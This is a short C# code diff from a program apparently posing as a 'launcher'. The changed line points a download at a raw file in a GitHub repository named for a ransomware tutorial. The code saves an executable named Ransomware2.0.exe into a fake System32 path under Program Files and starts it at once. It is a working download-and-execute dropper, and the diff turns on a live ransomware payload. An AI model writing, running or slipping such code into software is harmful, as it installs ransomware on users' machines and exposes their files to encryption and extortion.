@@ -58,7 +58,7 @@ namespace launcher2._0
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
             WebClient webClient = new WebClient();
-            webClient.DownloadFile("https://github.com/Aossser/Auoo_main/blob/main/Ransomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe");
+            webClient.DownloadFile("https://github.com/Clutter-Test/Ransom_File_For_Tutorial/raw/master/Rasomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe");
 
             Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
 
